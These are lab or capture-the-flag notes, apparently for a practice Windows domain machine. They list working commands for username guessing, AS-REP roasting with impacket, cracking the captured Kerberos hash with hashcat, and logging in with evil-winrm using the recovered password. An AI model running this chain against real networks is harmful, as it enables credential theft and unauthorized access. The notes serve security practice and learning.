- enumerated for subdomains no luck
- no usernames and need to enumerate ldap
- Trying Username anarchy https://github.com/urbanadventurer/username-anarchy
```
/opt/username-anarchy/username-anarchy -i names.txt --select-format firstlast,first.last,f.last,flast,lfirst,l.first,lastf,last.f,last.first,FLast,FirstLast,First.Last > guess_usernames.txt
```
- Searching for recon usernames and asrep-roastable with get-npusers
```
impacket-GetNPUsers -dc-ip 10.10.10.175 egotistical-bank.local/ -usersfile guess_usernames.txt -format hashcat -outputfile hashes.domain.txt
```
- Got a hash
```
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:89d2a903630fbe5d264d47dc365f162a$3c57dab680ac591184837a7c2e64b82ab3ad8bd6cf7a632fd35c1f5660f2a252f7080022b69667dee77e2eebef0284431a67a33a50c1e1ec8ba25d94f3bd94baa7c7a026f5c945defa1635c260f71a46fca361d557913e893cb4a5802860a16798e1e9462891d8fe6d8f293d89b99a31df44e405b5a2b6cecad52b03520e7e8a3ce62c9181763d4033c4b985919a84a636fc3b20710979d8d22a23164dabee06fe8b7de0bf3747b3ebcb9059454077f1f87df22b1f5ce7710ad8fc78061b6265de6e46dfc39503d8b25103d118ca592f7fc3e65e1fa16df41946eb5337c9754c4ae389d3573c840ee350a2fd41ba30b2da3be8e24e24f2c91da42612f48060d3
```
- Cracking with hashcat
```
hashcat -m 18200 hashes.domain.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
```
- Got the password
```
Thestrokes23 for fsmith@egotistical-bank.local
```
- Grab a user flag with evil-winrm real quick
```
evil-winrm -i 10.10.10.175 -p Thestrokes23 
```
